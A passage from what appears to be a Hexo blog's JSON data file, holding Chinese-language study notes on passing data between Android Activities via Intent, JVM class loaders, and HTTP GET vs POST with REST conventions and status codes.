class=\"keyword\">new</span> Intent(<span class=\"keyword\">this</span>,Main2Activity.class);</span><br><span class=\"line\">        editText = (EditText)findViewById(R.id.EditTextId);</span><br><span class=\"line\">        String message = editText.getText().toString();</span><br><span class=\"line\">        intent.putExtra(MESSAGE,message);</span><br><span class=\"line\">        startActivity(intent);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>首先要定义一个字符标记</strong><br><code>public final static String MESSAGE = &quot;com.example&quot;;</code></p>\n<p><strong>然后再xml文件中编写Button设置</strong><br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">Button</span></span><br><span class=\"line\">        <span class=\"attr\">android:id</span>=<span class=\"string\">\"@+id/ButtonId\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_width</span>=<span class=\"string\">\"wrap_content\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:onClick</span>=<span class=\"string\">\"sendMessage\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:text</span>=<span class=\"string\">\"send\"</span></span><br><span class=\"line\">        <span class=\"attr\">style</span>=<span class=\"string\">\"@style/Widget.AppCompat.Button.Colored\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_height</span>=<span class=\"string\">\"wrap_content\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_below</span>=<span class=\"string\">\"@+id/EditTextId\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_alignEnd</span>=<span class=\"string\">\"@+id/EditTextId\"</span></span><br><span class=\"line\">        <span class=\"attr\">android:layout_marginTop</span>=<span class=\"string\">\"52dp\"</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>其中只要看这个设置</strong><br><code>android:onClick=&quot;sendMessage&quot;</code></p>\n<p><strong>该设置是为Button设置监听器，然后将行为导向sendMessage方法</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">sendMessage</span><span class=\"params\">(View view)</span></span>&#123;</span><br><span class=\"line\">       Intent intent = <span class=\"keyword\">new</span> Intent(<span class=\"keyword\">this</span>,Main2Activity.class);</span><br><span class=\"line\">       editText = (EditText)findViewById(R.id.EditTextId);</span><br><span class=\"line\">       String message = editText.getText().toString();</span><br><span class=\"line\">       intent.putExtra(MESSAGE,message);</span><br><span class=\"line\">       startActivity(intent);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>在sendMessage方法里面只要是定义意图对象Intent来导向另外一个Activity，最后startActivity(intent)启动，其中用于将数据传输的介质是Extra-Message，主要方法是intent.putExtra(),然后在另一个Activity中得到该数据，使用方法</strong><br><code>String message = intent.getStringExtra(MainActivity.MESSAGE);</code></p>\n<h3 id=\"另一个Activity中的代码\"><a href=\"#另一个Activity中的代码\" class=\"headerlink\" title=\"另一个Activity中的代码\"></a>另一个Activity中的代码</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.administrator.myapplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> android.content.Intent;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.os.Bundle;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.widget.EditText;</span><br><span class=\"line\"><span class=\"keyword\">import</span> android.widget.TextView;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main2Activity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> TextView textView;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        setContentView(R.layout.activity_main2);</span><br><span class=\"line\"></span><br><span class=\"line\">        textView = (TextView)findViewById(R.id.TextView2Id);</span><br><span class=\"line\">        Intent intent = getIntent();</span><br><span class=\"line\">        String message = intent.getStringExtra(MainActivity.MESSAGE);</span><br><span class=\"line\">        textView.setText(message);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>同时要留意这行代码</strong><br><code>Intent intent = getIntent();</code></p>\n<p><strong>具体怎么个传输步骤还得多看代码，一直看，看到懂为止</strong></p>"},{"title":"JVM 小记","date":"2018-03-12T07:18:23.000Z","_content":"\n## 类加载机制\n\nJVM 的类加载是通过ClassLoader 及其子类完成的，加载分为三类加载\n### Bootstrap ClassLoader\n负责加载`$JAVA_HOME`中`jre/lib/rt.jar`里所有的class或者 -Xbootclasspath选项指定的jar包，`rt.jar`由C++实现，而不是ClassLoader子类\n\n### Extension ClassLoader\n负责加载Java平台中扩展功能的一些jar包，包括`$JAVA_HOME`中`jre/lib/*.jar`或`-Djava.ext.dirs`指定目录下的jar包\n\n### App ClassLoader\n负责加载classpath中指定的jar包及目录中的class\n\n### Custom ClassLoader\n属于应用程序根据自身需要定义的ClassLoader，如Tomcat、jboss都会根据J2EE规范自行实现ClasLoader。\n\n加载过程中会先检查类是否已加载，检查顺序是自`Custom`-->`Bootstrap`，只要某个Classloader已加载就视为已加载此类，保证此类只加载一次，而加载的顺序是自`Bootstrap`-->`Custom`\n\n### 双亲委托模型\n未完待续。。。。","source":"_posts/JVM.md","raw":"---\ntitle: JVM 小记\ndate: 2018-03-12 15:18:23\ncategories: Java\ntags:\n  - JVM\n  - GC\n---\n\n## 类加载机制\n\nJVM 的类加载是通过ClassLoader 及其子类完成的，加载分为三类加载\n### Bootstrap ClassLoader\n负责加载`$JAVA_HOME`中`jre/lib/rt.jar`里所有的class或者 -Xbootclasspath选项指定的jar包，`rt.jar`由C++实现，而不是ClassLoader子类\n\n### Extension ClassLoader\n负责加载Java平台中扩展功能的一些jar包，包括`$JAVA_HOME`中`jre/lib/*.jar`或`-Djava.ext.dirs`指定目录下的jar包\n\n### App ClassLoader\n负责加载classpath中指定的jar包及目录中的class\n\n### Custom ClassLoader\n属于应用程序根据自身需要定义的ClassLoader，如Tomcat、jboss都会根据J2EE规范自行实现ClasLoader。\n\n加载过程中会先检查类是否已加载，检查顺序是自`Custom`-->`Bootstrap`，只要某个Classloader已加载就视为已加载此类，保证此类只加载一次，而加载的顺序是自`Bootstrap`-->`Custom`\n\n### 双亲委托模型\n未完待续。。。。","slug":"JVM","published":1,"updated":"2018-03-17T06:23:46.139Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscwi0002yp0lc88hixkl","content":"<h2 id=\"类加载机制\"><a href=\"#类加载机制\" class=\"headerlink\" title=\"类加载机制\"></a>类加载机制</h2><p>JVM 的类加载是通过ClassLoader 及其子类完成的，加载分为三类加载</p>\n<h3 id=\"Bootstrap-ClassLoader\"><a href=\"#Bootstrap-ClassLoader\" class=\"headerlink\" title=\"Bootstrap ClassLoader\"></a>Bootstrap ClassLoader</h3><p>负责加载<code>$JAVA_HOME</code>中<code>jre/lib/rt.jar</code>里所有的class或者 -Xbootclasspath选项指定的jar包，<code>rt.jar</code>由C++实现，而不是ClassLoader子类</p>\n<h3 id=\"Extension-ClassLoader\"><a href=\"#Extension-ClassLoader\" class=\"headerlink\" title=\"Extension ClassLoader\"></a>Extension ClassLoader</h3><p>负责加载Java平台中扩展功能的一些jar包，包括<code>$JAVA_HOME</code>中<code>jre/lib/*.jar</code>或<code>-Djava.ext.dirs</code>指定目录下的jar包</p>\n<h3 id=\"App-ClassLoader\"><a href=\"#App-ClassLoader\" class=\"headerlink\" title=\"App ClassLoader\"></a>App ClassLoader</h3><p>负责加载classpath中指定的jar包及目录中的class</p>\n<h3 id=\"Custom-ClassLoader\"><a href=\"#Custom-ClassLoader\" class=\"headerlink\" title=\"Custom ClassLoader\"></a>Custom ClassLoader</h3><p>属于应用程序根据自身需要定义的ClassLoader，如Tomcat、jboss都会根据J2EE规范自行实现ClasLoader。</p>\n<p>加载过程中会先检查类是否已加载，检查顺序是自<code>Custom</code>–&gt;<code>Bootstrap</code>，只要某个Classloader已加载就视为已加载此类，保证此类只加载一次，而加载的顺序是自<code>Bootstrap</code>–&gt;<code>Custom</code></p>\n<h3 id=\"双亲委托模型\"><a href=\"#双亲委托模型\" class=\"headerlink\" title=\"双亲委托模型\"></a>双亲委托模型</h3><p>未完待续。。。。</p>\n","excerpt":"","more":"<h2 id=\"类加载机制\"><a href=\"#类加载机制\" class=\"headerlink\" title=\"类加载机制\"></a>类加载机制</h2><p>JVM 的类加载是通过ClassLoader 及其子类完成的，加载分为三类加载</p>\n<h3 id=\"Bootstrap-ClassLoader\"><a href=\"#Bootstrap-ClassLoader\" class=\"headerlink\" title=\"Bootstrap ClassLoader\"></a>Bootstrap ClassLoader</h3><p>负责加载<code>$JAVA_HOME</code>中<code>jre/lib/rt.jar</code>里所有的class或者 -Xbootclasspath选项指定的jar包，<code>rt.jar</code>由C++实现，而不是ClassLoader子类</p>\n<h3 id=\"Extension-ClassLoader\"><a href=\"#Extension-ClassLoader\" class=\"headerlink\" title=\"Extension ClassLoader\"></a>Extension ClassLoader</h3><p>负责加载Java平台中扩展功能的一些jar包，包括<code>$JAVA_HOME</code>中<code>jre/lib/*.jar</code>或<code>-Djava.ext.dirs</code>指定目录下的jar包</p>\n<h3 id=\"App-ClassLoader\"><a href=\"#App-ClassLoader\" class=\"headerlink\" title=\"App ClassLoader\"></a>App ClassLoader</h3><p>负责加载classpath中指定的jar包及目录中的class</p>\n<h3 id=\"Custom-ClassLoader\"><a href=\"#Custom-ClassLoader\" class=\"headerlink\" title=\"Custom ClassLoader\"></a>Custom ClassLoader</h3><p>属于应用程序根据自身需要定义的ClassLoader，如Tomcat、jboss都会根据J2EE规范自行实现ClasLoader。</p>\n<p>加载过程中会先检查类是否已加载，检查顺序是自<code>Custom</code>–&gt;<code>Bootstrap</code>，只要某个Classloader已加载就视为已加载此类，保证此类只加载一次，而加载的顺序是自<code>Bootstrap</code>–&gt;<code>Custom</code></p>\n<h3 id=\"双亲委托模型\"><a href=\"#双亲委托模型\" class=\"headerlink\" title=\"双亲委托模型\"></a>双亲委托模型</h3><p>未完待续。。。。</p>\n"},{"title":"GET vs POST","date":"2018-04-13T07:18:23.000Z","_content":"\n在综合考虑下，决定复习一些Web方向的东西，以备不时之需。。。。\n\n## What is HTTP?\nHTTP全称`Hypertext Transfer Protocol`(就是中文常说的`超文本传输协议`)，这个协议是为了客户端和服务端能进行通信。HTTP是客户端和服务端进行请求响应过程的协议，客户端发送请求，服务端响应这个请求并返回信息。通常一个web浏览器作为一个客户端，而一台提供web服务的机器作为服务端。\n\n## Two HTTP Request Methods: GET and POST\n两个非常常用的请求响应方法 : GET and POST。\n- `GET`- Requests data from a specified resource\n- `POST`- Submits data to be processed to a specified resource\n\n### The GET Method\nGET请求方法会将请求信息放在URL中\n``` http\n/test/demo_form.php?name1=value1&name2=value2\n```\nGET其他特性：\n- GET请求能被缓存\n- GET请求会保留在浏览器的历史记录中\n- GET请求可以被标为书签\n- GET请求不应该用在处理敏感数据时候\n- GET请求有长度限制\n- GET只应该用在取回数据\n\n> 总的来说，由于GET请求数据被放在URL中，以及它能缓存，便导致了上述的其他特性。诸如`GET请求会保留在浏览器的历史记录中` `GET请求可以被标为书签` `GET请求不应该用在处理敏感数据时候`这三条就是因为GET请求会被缓存，且请求数据在URL中，又因为浏览器或者说操作系统对URL的长度有要求，所以GET请求有长度限制。\n\n<!--more-->\n### The POST Method\nPOST请求包含的数据放在了HTTP数据报中\n``` http\nPOST /test/demo_form.php HTTP/1.1\nHost: w3schools.com\nname1=value1&name2=value2\n```\nPOST其他特性：\n- POST请求不会被缓存\n- POST请求不会保留在浏览器历史记录中\n- POST请求不会被标记为书签\n- POST请求对数据长度没有限制\n\n## Compare GET vs. POST\n|             |  GET    |  POST  |\n|-------------|---------|--------|\n| 返回/回退    |  没有任何影响(因为有缓存机制)  | 数据会被重新提交(浏览器会提醒用户数据会被重新提交) |\n| 书签         | 可以作为书签 | 不能作为书签 |\n| 缓存         | 可以被缓存 | 不能被缓存 |\n| 编码类型     | application/x-www-form-urlencoded | application/x-www-form-urlencoded or multipart/form-data. Use multipart encoding for binary data |\n| 历史记录     | 参数会保留在浏览器历史记录中 | 参数不会保留在历史记录中 |\n| 数据长度限制  | GET数据会放在URL中，URL的最大长度为2048个字符 | 没有限制 |\n| 数据类型限制  | 只允许ASCII字符 | 没有限制 |\n| 安全性       | GET数据安全性低于PSOT，因为它将数据放入URL(一定不用GET发送密码或者其他敏感数据) | POST安全性略高于GET，它的数据不会保留在浏览器历史中，也不会保留在服务器日志文件中(但不是绝对安全，其他人可以截获数据包，分析数据包得到数据) |\n\n## Other HTTP Request Methods\n| Method | Description |\n|--------|--------|\n| HEAD | Same as GET but returns only HTTP headers and no document body |\n| PUT  | Uploads a representation of the specified URI |\n| DELETE | Deletes the specified resource |\n| OPTIONS | Returns the HTTP methods that the server supports |\n| CONNECT | Converts the request connection to a transparent TCP/IP tunnel |\n\n## REST 方法使用标准\n下列是常用的REST方法定义：\n\n- GET（SELECT）：从服务器取出资源（一项或多项）\n- POST（CREATE）：在服务器新建一个资源\n- PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）\n- PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）\n- DELETE（DELETE）：从服务器删除资源\n\n使用例子：\n\n- GET /zoos：列出所有动物园\n- POST /zoos：新建一个动物园\n- GET /zoos/ID：获取某个指定动物园的信息\n- PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息\n- PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）\n- DELETE /zoos/ID：删除某个动物园\n- GET /zoos/ID/animals：列出某个指定动物园的所有动物\n- DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物\n\n## 状态码(Status Code)\n- 200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的(Idempotent)\n- 201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。\n- 202 Accepted - [\\*]：表示一个请求已经进入后台排队(异步任务)\n- 204 NO CONTENT - [DELETE]：用户删除数据成功。\n- 400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。\n- 401 Unauthorized - [\\*]：表示用户没有权限（令牌、用户名、密码错误）。\n- 403 Forbidden - [\\*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。\n- 404 NOT FOUND - [\\*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。\n- 406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。\n- 410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。\n- 422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。\n- 500 INTERNAL SERVER ERROR - [\\*]：服务器发生错误，用户将无法判断发出的请求是否成功。\n\n## 参考链接\n- [HTTP Methods: GET vs. POST](https://www.w3schools.com/tags/ref_httpmethods.asp)\n- [RESTful API 设计指南](http://www.ruanyifeng.com/blog/2014/05/restful_api.html)","source":"_posts/GET_POST.md","raw":"---\ntitle: GET vs POST\ndate: 2018-04-13 15:18:23\ncategories: Web\ntags:\n  - GET\n  - POST\n  - HTTP\n---\n\n在综合考虑下，决定复习一些Web方向的东西，以备不时之需。。。。\n\n## What is HTTP?\nHTTP全称`Hypertext Transfer Protocol`(就是中文常说的`超文本传输协议`)，这个协议是为了客户端和服务端能进行通信。HTTP是客户端和服务端进行请求响应过程的协议，客户端发送请求，服务端响应这个请求并返回信息。通常一个web浏览器作为一个客户端，而一台提供web服务的机器作为服务端。\n\n## Two HTTP Request Methods: GET and POST\n两个非常常用的请求响应方法 : GET and POST。\n- `GET`- Requests data from a specified resource\n- `POST`- Submits data to be processed to a specified resource\n\n### The GET Method\nGET请求方法会将请求信息放在URL中\n``` http\n/test/demo_form.php?name1=value1&name2=value2\n```\nGET其他特性：\n- GET请求能被缓存\n- GET请求会保留在浏览器的历史记录中\n- GET请求可以被标为书签\n- GET请求不应该用在处理敏感数据时候\n- GET请求有长度限制\n- GET只应该用在取回数据\n\n> 总的来说，由于GET请求数据被放在URL中，以及它能缓存，便导致了上述的其他特性。诸如`GET请求会保留在浏览器的历史记录中` `GET请求可以被标为书签` `GET请求不应该用在处理敏感数据时候`这三条就是因为GET请求会被缓存，且请求数据在URL中，又因为浏览器或者说操作系统对URL的长度有要求，所以GET请求有长度限制。\n\n<!--more-->\n### The POST Method\nPOST请求包含的数据放在了HTTP数据报中\n``` http\nPOST /test/demo_form.php HTTP/1.1\nHost: w3schools.com\nname1=value1&name2=value2\n```\nPOST其他特性：\n- POST请求不会被缓存\n- POST请求不会保留在浏览器历史记录中\n- POST请求不会被标记为书签\n- POST请求对数据长度没有限制\n\n## Compare GET vs. POST\n|             |  GET    |  POST  |\n|-------------|---------|--------|\n| 返回/回退    |  没有任何影响(因为有缓存机制)  | 数据会被重新提交(浏览器会提醒用户数据会被重新提交) |\n| 书签         | 可以作为书签 | 不能作为书签 |\n| 缓存         | 可以被缓存 | 不能被缓存 |\n| 编码类型     | application/x-www-form-urlencoded | application/x-www-form-urlencoded or multipart/form-data. Use multipart encoding for binary data |\n| 历史记录     | 参数会保留在浏览器历史记录中 | 参数不会保留在历史记录中 |\n| 数据长度限制  | GET数据会放在URL中，URL的最大长度为2048个字符 | 没有限制 |\n| 数据类型限制  | 只允许ASCII字符 | 没有限制 |\n| 安全性       | GET数据安全性低于PSOT，因为它将数据放入URL(一定不用GET发送密码或者其他敏感数据) | POST安全性略高于GET，它的数据不会保留在浏览器历史中，也不会保留在服务器日志文件中(但不是绝对安全，其他人可以截获数据包，分析数据包得到数据) |\n\n## Other HTTP Request Methods\n| Method | Description |\n|--------|--------|\n| HEAD | Same as GET but returns only HTTP headers and no document body |\n| PUT  | Uploads a representation of the specified URI |\n| DELETE | Deletes the specified resource |\n| OPTIONS | Returns the HTTP methods that the server supports |\n| CONNECT | Converts the request connection to a transparent TCP/IP tunnel |\n\n## REST 方法使用标准\n下列是常用的REST方法定义：\n\n- GET（SELECT）：从服务器取出资源（一项或多项）\n- POST（CREATE）：在服务器新建一个资源\n- PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）\n- PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）\n- DELETE（DELETE）：从服务器删除资源\n\n使用例子：\n\n- GET /zoos：列出所有动物园\n- POST /zoos：新建一个动物园\n- GET /zoos/ID：获取某个指定动物园的信息\n- PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息\n- PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）\n- DELETE /zoos/ID：删除某个动物园\n- GET /zoos/ID/animals：列出某个指定动物园的所有动物\n- DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物\n\n## 状态码(Status Code)\n- 200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的(Idempotent)\n- 201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。\n- 202 Accepted - [\\*]：表示一个请求已经进入后台排队(异步任务)\n- 204 NO CONTENT - [DELETE]：用户删除数据成功。\n- 400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。\n- 401 Unauthorized - [\\*]：表示用户没有权限（令牌、用户名、密码错误）。\n- 403 Forbidden - [\\*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。\n- 404 NOT FOUND - [\\*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。\n- 406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。\n- 410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。\n- 422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。\n- 500 INTERNAL SERVER ERROR - [\\*]：服务器发生错误，用户将无法判断发出的请求是否成功。\n\n## 参考链接\n- [HTTP Methods: GET vs. POST](https://www.w3schools.com/tags/ref_httpmethods.asp)\n- [RESTful API 设计指南](http://www.ruanyifeng.com/blog/2014/05/restful_api.html)","slug":"GET_POST","published":1,"updated":"2018-04-13T06:34:32.186Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscwr0006yp0lfk1thg30","content":"<p>在综合考虑下，决定复习一些Web方向的东西，以备不时之需。。。。</p>\n<h2 id=\"What-is-HTTP\"><a href=\"#What-is-HTTP\" class=\"headerlink\" title=\"What is HTTP?\"></a>What is HTTP?</h2><p>HTTP全称<code>Hypertext Transfer Protocol</code>(就是中文常说的<code>超文本传输协议</code>)，这个协议是为了客户端和服务端能进行通信。HTTP是客户端和服务端进行请求响应过程的协议，客户端发送请求，服务端响应这个请求并返回信息。通常一个web浏览器作为一个客户端，而一台提供web服务的机器作为服务端。</p>\n<h2 id=\"Two-HTTP-Request-Methods-GET-and-POST\"><a href=\"#Two-HTTP-Request-Methods-GET-and-POST\" class=\"headerlink\" title=\"Two HTTP Request Methods: GET and POST\"></a>Two HTTP Request Methods: GET and POST</h2><p>两个非常常用的请求响应方法 : GET and POST。</p>\n<ul>\n<li><code>GET</code>- Requests data from a specified resource</li>\n<li><code>POST</code>- Submits data to be processed to a specified resource</li>\n</ul>\n<h3 id=\"The-GET-Method\"><a href=\"#The-GET-Method\" class=\"headerlink\" title=\"The GET Method\"></a>The GET Method</h3><p>GET请求方法会将请求信息放在URL中<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/test/demo_form.php?name1=value1&amp;name2=value2</span><br></pre></td></tr></table></figure></p>\n<p>GET其他特性：</p>\n<ul>\n<li>GET请求能被缓存</li>\n<li>GET请求会保留在浏览器的历史记录中</li>\n<li>GET请求可以被标为书签</li>\n<li>GET请求不应该用在处理敏感数据时候</li>\n<li>GET请求有长度限制</li>\n<li>GET只应该用在取回数据</li>\n</ul>\n<blockquote>\n<p>总的来说，由于GET请求数据被放在URL中，以及它能缓存，便导致了上述的其他特性。诸如<code>GET请求会保留在浏览器的历史记录中</code> <code>GET请求可以被标为书签</code> <code>GET请求不应该用在处理敏感数据时候</code>这三条就是因为GET请求会被缓存，且请求数据在URL中，又因为浏览器或者说操作系统对URL的长度有要求，所以GET请求有长度限制。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h3 id=\"The-POST-Method\"><a href=\"#The-POST-Method\" class=\"headerlink\" title=\"The POST Method\"></a>The POST Method</h3><p>POST请求包含的数据放在了HTTP数据报中<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /test/demo_form.php HTTP/1.1</span><br><span class=\"line\">Host: w3schools.com</span><br><span class=\"line\">name1=value1&amp;name2=value2</span><br></pre></td></tr></table></figure></p>\n<p>POST其他特性：</p>\n<ul>\n<li>POST请求不会被缓存</li>\n<li>POST请求不会保留在浏览器历史记录中</li>\n<li>POST请求不会被标记为书签</li>\n<li>POST请求对数据长度没有限制</li>\n</ul>\n<h2 id=\"Compare-GET-vs-POST\"><a href=\"#Compare-GET-vs-POST\" class=\"headerlink\" title=\"Compare GET vs. POST\"></a>Compare GET vs. POST</h2><table>\n<thead>\n<tr>\n<th></th>\n<th>GET</th>\n<th>POST</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>返回/回退</td>\n<td>没有任何影响(因为有缓存机制)</td>\n<td>数据会被重新提交(浏览器会提醒用户数据会被重新提交)</td>\n</tr>\n<tr>\n<td>书签</td>\n<td>可以作为书签</td>\n<td>不能作为书签</td>\n</tr>\n<tr>\n<td>缓存</td>\n<td>可以被缓存</td>\n<td>不能被缓存</td>\n</tr>\n<tr>\n<td>编码类型</td>\n<td>application/x-www-form-urlencoded</td>\n<td>application/x-www-form-urlencoded or multipart/form-data. Use multipart encoding for binary data</td>\n</tr>\n<tr>\n<td>历史记录</td>\n<td>参数会保留在浏览器历史记录中</td>\n<td>参数不会保留在历史记录中</td>\n</tr>\n<tr>\n<td>数据长度限制</td>\n<td>GET数据会放在URL中，URL的最大长度为2048个字符</td>\n<td>没有限制</td>\n</tr>\n<tr>\n<td>数据类型限制</td>\n<td>只允许ASCII字符</td>\n<td>没有限制</td>\n</tr>\n<tr>\n<td>安全性</td>\n<td>GET数据安全性低于PSOT，因为它将数据放入URL(一定不用GET发送密码或者其他敏感数据)</td>\n<td>POST安全性略高于GET，它的数据不会保留在浏览器历史中，也不会保留在服务器日志文件中(但不是绝对安全，其他人可以截获数据包，分析数据包得到数据)</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Other-HTTP-Request-Methods\"><a href=\"#Other-HTTP-Request-Methods\" class=\"headerlink\" title=\"Other HTTP Request Methods\"></a>Other HTTP Request Methods</h2><table>\n<thead>\n<tr>\n<th>Method</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>HEAD</td>\n<td>Same as GET but returns only HTTP headers and no document body</td>\n</tr>\n<tr>\n<td>PUT</td>\n<td>Uploads a representation of the specified URI</td>\n</tr>\n<tr>\n<td>DELETE</td>\n<td>Deletes the specified resource</td>\n</tr>\n<tr>\n<td>OPTIONS</td>\n<td>Returns the HTTP methods that the server supports</td>\n</tr>\n<tr>\n<td>CONNECT</td>\n<td>Converts the request connection to a transparent TCP/IP tunnel</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"REST-方法使用标准\"><a href=\"#REST-方法使用标准\" class=\"headerlink\" title=\"REST 方法使用标准\"></a>REST 方法使用标准</h2><p>下列是常用的REST方法定义：</p>\n<ul>\n<li>GET（SELECT）：从服务器取出资源（一项或多项）</li>\n<li>POST（CREATE）：在服务器新建一个资源</li>\n<li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）</li>\n<li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）</li>\n<li>DELETE（DELETE）：从服务器删除资源</li>\n</ul>\n<p>使用例子：</p>\n<ul>\n<li>GET /zoos：列出所有动物园</li>\n<li>POST /zoos：新建一个动物园</li>\n<li>GET /zoos/ID：获取某个指定动物园的信息</li>\n<li>PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息</li>\n<li>PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）</li>\n<li>DELETE /zoos/ID：删除某个动物园</li>\n<li>GET /zoos/ID/animals：列出某个指定动物园的所有动物</li>\n<li>DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物</li>\n</ul>\n<h2 id=\"状态码-Status-Code\"><a href=\"#状态码-Status-Code\" class=\"headerlink\" title=\"状态码(Status Code)\"></a>状态码(Status Code)</h2><ul>\n<li>200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的(Idempotent)</li>\n<li>201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。</li>\n<li>202 Accepted - [*]：表示一个请求已经进入后台排队(异步任务)</li>\n<li>204 NO CONTENT - [DELETE]：用户删除数据成功。</li>\n<li>400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。</li>\n<li>401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。</li>\n<li>403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。</li>\n<li>404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。</li>\n<li>406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。</li>\n<li>410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。</li>\n<li>422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。</li>\n<li>500 INTERNAL SERVER ERROR - 